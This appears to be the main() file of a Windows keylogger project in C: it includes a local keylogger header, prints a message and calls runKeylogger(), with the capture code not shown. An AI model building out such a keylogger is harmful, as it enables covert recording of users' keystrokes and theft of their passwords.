#include <stdio.h>
#include <windows.h> //also includes winuser.h for UI shit
#include "keylogger.h"

int main() {
    printf("Executing keylogger...\n");
    runKeylogger();
    return 0;
}